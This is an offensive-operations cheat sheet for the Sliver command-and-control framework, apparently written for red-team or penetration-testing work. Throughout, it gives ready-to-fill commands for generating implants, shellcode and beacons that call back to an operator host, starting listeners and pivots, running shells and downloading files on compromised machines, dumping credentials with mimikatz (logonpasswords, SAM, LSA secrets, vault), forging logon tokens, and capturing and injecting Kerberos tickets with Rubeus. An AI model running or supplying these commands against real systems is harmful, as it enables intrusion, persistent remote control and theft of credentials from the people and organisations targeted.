# Sliver

<!-- cheat
export sliver
var tool = sh -c 'printf "%s\n" "$windows_tools/mimikatz.exe"; find "$windows_tools/" -maxdepth 1 -type f ! -name ".*" -printf "%p\n" | sort' --- --header 'Windows tools'
var lport = printf '%s\n' '9001' '443' '5555' '4444' '1337' --- --header 'Ports'
var type = printf '%s\n' 'mtls' 'http' 'tcp-pivot' --- --header 'Implant type'
var os = printf '%s\n' 'windows' 'linux' 'temple-os' --- --header 'Operating system'
var name = printf '%s\n' 'win' 'lin' 'pivot' --- --header 'Implant name'
var template = printf '%s\n' '--skip-symbols' '' --- --header 'Sliver templates'
var mimicommands = printf '%s\n' 'sekurlsa::logonpasswords' 'sekurlsa::dpapi' 'sekurlsa::ekeys' 'sekurlsa::wdigest' 'lsadump::sam' 'lsadump::secrets' 'lsadump::cache' 'vault::list' 'vault::cred /patch' --- --header 'Mimikatz commands <- You should know what they do'
var logon_type = printf '%s\n' 'LOGON_INTERACTIVE' 'LOGON_NETWORK' 'LOGON_BATCH' 'LOGON_SERVICE' 'LOGON_UNLOCK' 'LOGON_NETWORK_CLEARTEXT' 'LOGON_NEW_CREDENTIALS'
-->

## Sliver implants

### Start server

Start server with Sliver.

Start the Sliver server.

```sh title:"Sliver Start Server"
sliver server
```
<!-- cheat -->

### Start client

Start client with Sliver.

Start the Sliver client.

```sh title:"Sliver Start Client"
sliver client
```
<!-- cheat -->

### Generate implant

Generate implant with Sliver.

Build a sliver implant for the chosen transport (mtls/http/tcp-pivot), OS, and naming. `--skip-symbols` shrinks the binary at the cost of debug info.

```sh title:"Sliver Generate Implant"
generate --$type $lhost:$lport --os $os -N $name $template
```
<!-- cheat
import tun_ip
import sliver
var type
var lport
var os
var name
var template
-->

### Generate shared library

Generate shared library with Sliver.

Build a Windows DLL/shared-library implant over mTLS.

```sh title:"Sliver Generate Shared Library"
generate --format shared --mtls $lhost
```
<!-- cheat
var lhost
-->

### Generate shellcode

Generate shellcode with Sliver.

Build Windows shellcode over mTLS.

```sh title:"Sliver Generate Shellcode"
generate --format shellcode --mtls $lhost
```
<!-- cheat
var lhost
-->

### Generate beacon

Generate beacon with Sliver.

Build a Sliver beacon implant over mTLS.

```sh title:"Sliver Generate Beacon"
generate beacon --mtls $lhost
```
<!-- cheat
var lhost
-->

### Generate DNS canary

Generate DNS canary with Sliver.

Build an mTLS implant with a DNS canary.

```sh title:"Sliver Generate DNS Canary"
generate --mtls $lhost --canary $canary_domain
```
<!-- cheat
var lhost
var canary_domain
-->

### Generate execution-limited

Generate execution limited with Sliver.

Build an implant limited to a hostname, username, and domain-joined systems.

```sh title:"Sliver Generate Execution Limited"
generate --mtls $lhost --limit-hostname $rhost_name --limit-username $user --limit-domainjoined
```
<!-- cheat
var lhost
var rhost_name
var user
-->

## Sliver pivots

### Start TCP pivot

Start TCP pivot with Sliver.

Open a TCP pivot listener on the implant. Other implants can callback through this one to reach the C2.

```sh title:"Sliver Start TCP Pivot"
pivot start $rhost_ip:$lport
```
<!-- cheat
import sliver
var rhost_ip
var lport
-->

## Sliver uploads

### Push tool

Run push tool with Sliver.

Upload a tool from your `$windows_tools` collection straight into the implant session.

```sh title:"Sliver Run Push Tool"
upload "$tool"
```
<!-- cheat
import tun_ip
import sliver
var tool
-->

## Sliver listeners

### Quick listener

List quick listener with Sliver.

Spin up a listener of the chosen type bound to host:port. One-liner alternative to the verbose `mtls`/`http` commands.

```sh title:"Sliver List Quick Listener"
$type -L $rhost_ip -l $lport
```
<!-- cheat
import sliver
var type
var rhost_ip
var lport
-->

### mTLS listener

List mTLS listener with Sliver.

Start an mTLS listener.

```sh title:"Sliver List MTLS Listener"
mtls --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

### HTTP listener

List HTTP listener with Sliver.

Start an HTTP listener.

```sh title:"Sliver List HTTP Listener"
http --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

### HTTPS listener

List HTTPS listener with Sliver.

Start an HTTPS listener.

```sh title:"Sliver List HTTPS Listener"
https --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

### DNS listener

List DNS listener with Sliver.

Start a DNS listener.

```sh title:"Sliver List DNS Listener"
dns --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

### Stage listener

List stage listener with Sliver.

Start a stage listener.

```sh title:"Sliver List Stage Listener"
stage-listener --lhost $lhost --lport $lport
```
<!-- cheat
var lhost
var lport
-->

## Sliver session

### Jobs

List jobs with Sliver.

List active Sliver listener jobs.

```sh title:"Sliver List Jobs"
jobs
```
<!-- cheat -->

### Sessions

List sessions with Sliver.

List active sessions.

```sh title:"Sliver List Sessions"
sessions
```
<!-- cheat -->

### Beacons

List beacons with Sliver.

List active beacons.

```sh title:"Sliver List Beacons"
beacons
```
<!-- cheat -->

### Use session

Run use session with Sliver.

Interact with a session.

```sh title:"Sliver Run Use Session"
use $session_id
```
<!-- cheat
var session_id
-->

### Background

Run background with Sliver.

Background the active session.

```sh title:"Sliver Run Background"
background
```
<!-- cheat -->

### Execute

Execute execute with Sliver.

Execute a process in the active session.

```sh title:"Sliver Execute Execute"
execute $command
```
<!-- cheat
var command
-->

### Shell

Spawn shell with Sliver.

Run a shell command in the active session.

```sh title:"Sliver Spawn Shell"
shell $command
```
<!-- cheat
var command
-->

### Download

Download download with Sliver.

Download a file from the target.

```sh title:"Sliver Download Download"
download $remote_file
```
<!-- cheat
var remote_file
-->

## Sliver mimikatz

### Run mimikatz

Run mimikatz with Sliver.

Run a mimikatz command through the implant's built-in module. Pre-loaded with common credential dumping commands.

```sh title:"Sliver Run Mimikatz"
mimikatz $mimicommands
```
<!-- cheat
import sliver
-->

## Sliver forge-token

### Make token

Create make token with Sliver.

Forge a logon token for cleartext credentials. Use `.` as domain for local accounts. Pick the LOGON_* type matching the target service.

```sh title:"Sliver Create Make Token"
make-token -d $domain -u $user -p '$pass' --logon-type $logon_type
```
<!-- cheat
import tun_ip
import sliver
import domain_ip
import users
import passwords
var logon_type
-->

## Sliver rubeus-monitor

### Coerce monitor (filtered)

Trigger monitor (filtered) with Sliver.

Run Rubeus monitor through the implant, filtering on the coerced machine account so you only catch the target's TGT.

```sh title:"Sliver Trigger Monitor (filtered)"
rubeus -t 30 -- monitor /interval:$interval /runfor:$runfor /filteruser:$rhost_name$ /nowrap
```
<!-- cheat
import tun_ip
import sliver
import domain_ip
import users
var interval
var runfor
var rhost_name
-->

### Coerce monitor (unfiltered)

Trigger monitor (unfiltered) with Sliver.

Same monitor but unfiltered. Catches every TGT that lands on the host (noisier output).

```sh title:"Sliver Trigger Monitor (unfiltered)"
rubeus -t 30 -- monitor /interval:$interval /runfor:$runfor /nowrap
```
<!-- cheat
import tun_ip
import sliver
import domain_ip
import users
var interval
var runfor
-->

## Sliver Rubeus ptt-inject

### Inject TGT

Run inject TGT with Sliver.

Inject a base64 ticket into the current process via Rubeus running through the implant.

```sh title:"Sliver Run Inject TGT"
rubeus -i -- ptt /ticket:inject_ticket_here
```
<!-- cheat -->

### Dump tickets

Dump tickets with Sliver.

Dump all tickets in the current LSA session.

```sh title:"Sliver Dump Tickets"
rubeus dump /nowrap 
```
<!-- cheat -->
